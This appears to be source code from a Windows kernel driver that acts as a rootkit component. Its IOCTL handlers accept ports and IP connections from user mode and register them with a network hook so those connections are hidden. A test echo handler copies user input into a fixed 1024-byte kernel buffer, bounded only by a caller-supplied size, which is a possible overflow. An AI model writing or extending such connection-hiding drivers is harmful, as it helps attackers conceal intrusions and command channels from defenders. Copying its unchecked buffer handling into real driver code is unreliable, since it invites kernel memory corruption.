#include "IoctlHandlers.h"
#include "NetworkHook.h"
#include <Ntstrsafe.h>

NTSTATUS IoctlHandlers::HandleTestConnection(_In_ PIRP Irp, _In_ const size_t BufferSize) 
{

	NTSTATUS status{STATUS_SUCCESS};

	char* inputBuf = static_cast<char*>(Irp->AssociatedIrp.SystemBuffer);
	char* outputBuf = static_cast<char*>(Irp->AssociatedIrp.SystemBuffer);

	KdPrint(("TEST_CONN-got input: %s\n", inputBuf));

	char* outputPrefix = "hello from kernel mode :-) recived input-";

	//return "STATUS_BUFFER_TOO_SMALL" if return buffer length is too small
	if (BufferSize < (strlen(inputBuf) + strlen(outputPrefix) + 1)) {

		KdPrint(("TEST_CONN-ouput buffer too small.\n"));
		status = STATUS_BUFFER_TOO_SMALL;
		Irp->IoStatus.Information = 0;

	}

	else 
	{
		//init a buffer from paged pool
		char* readBuf = reinterpret_cast<char*>(ExAllocatePool2(POOL_FLAG_PAGED, 1024, TAG_NET));
		if (readBuf == nullptr)
		{
			status = STATUS_INSUFFICIENT_RESOURCES;
			Irp->IoStatus.Status = status;
			Irp->IoStatus.Information = 0;
			return status;
		}

		RtlZeroMemory(readBuf, 1024);

		//set the buffer to prefix ("hello from kernel mode...") + user input
		RtlStringCbCatA(readBuf, BufferSize, outputPrefix);
		RtlStringCbCatA(readBuf, BufferSize - strlen(outputPrefix) - 1, outputBuf);

		//copy the memory to the output buffer
		RtlCopyMemory(outputBuf, readBuf, strlen(readBuf) + 1);

		//free the paged pool buffer
		ExFreePoolWithTag(readBuf, TAG_NET);

		KdPrint(("TEST_CONN-sending to usermode %s\n", outputBuf));
		status = STATUS_SUCCESS;
		Irp->IoStatus.Information = strlen(outputBuf) + 1;
	}

	Irp->IoStatus.Status = status;
	return status;
}

static NTSTATUS NetAddHiddenPortFromIrp(
	_In_ PIRP Irp)
{	
	PCSZ inputBuf = (PCSZ)(Irp->AssociatedIrp.SystemBuffer);
	ASSERT(inputBuf != nullptr);

	ANSI_STRING pidAnsiString{};
	UNICODE_STRING pidUnicodeString{};
	RtlInitAnsiString(&pidAnsiString, inputBuf);
	RtlAnsiStringToUnicodeString(&pidUnicodeString, &pidAnsiString, TRUE);

	KdPrint(("HIDE_PORT-Port Unicode String: %wZ\n", &pidUnicodeString));

	ULONG port{ 0 };
	NTSTATUS status = RtlUnicodeStringToInteger(&pidUnicodeString, 10, &port);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("HIDE_PORT-Failed to convert Port to Integer Value: status[0x%X]\n", status));
		return STATUS_INVALID_PARAMETER;
	}

	if (port == 0)
	{
		KdPrint(("HIDE_PORT-Failed to convert Port to Integer Value\n"));
		return STATUS_INVALID_PARAMETER;
	}

	NetHook::NETHOOK_HIDDEN_CONNECTION hiddenConnection{};
	hiddenConnection.Port = (USHORT)port;

	NetHook::NetAddHiddenConnection(&hiddenConnection);
	return status;

}

NTSTATUS  IoctlHandlers::HandleHidePort(
	_In_ PIRP Irp,
	_In_ const size_t InputBufferLength)
{
	if (InputBufferLength == 0)
	{
		KdPrint(("Invalid Length:%d\n", InputBufferLength));

		Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}

	KdPrint(("Input Buffer Length:%d\n", InputBufferLength));
	KdPrint(("InputPort:%s\n", (char*)Irp->AssociatedIrp.SystemBuffer));
	NTSTATUS status{ NetAddHiddenPortFromIrp(Irp) };

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	return status;
}

NTSTATUS  IoctlHandlers::HandleHideIP(
	_In_ PIRP Irp,
	_In_ const size_t InputBufferLength)
{
	if (InputBufferLength != sizeof(NetHook::NETHOOK_HIDDEN_CONNECTION))
	{
		KdPrint(("Invalid Length! %d", InputBufferLength));

		Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}

	NetHook::PNETHOOK_HIDDEN_CONNECTION inputBuf = static_cast<NetHook::PNETHOOK_HIDDEN_CONNECTION>(Irp->AssociatedIrp.SystemBuffer);
	ASSERT(inputBuf != nullptr);

	NetHook::NetAddHiddenConnection(inputBuf);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	return STATUS_SUCCESS;
}

NTSTATUS IoctlHandlers::HandleHideRemoteIP(
	_In_ PIRP Irp,
	_In_ const size_t InputBufferLength)
{
	if (InputBufferLength != sizeof(NetHook::NETHOOK_HIDDEN_CONNECTION))
	{
		KdPrint(("Invalid Length! %d", InputBufferLength));

		Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}

	NetHook::PNETHOOK_HIDDEN_CONNECTION inputBuf = static_cast<NetHook::PNETHOOK_HIDDEN_CONNECTION>(Irp->AssociatedIrp.SystemBuffer);
	ASSERT(inputBuf != nullptr);

	NetHook::NetAddHiddenConnection(inputBuf);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	return STATUS_SUCCESS;
}
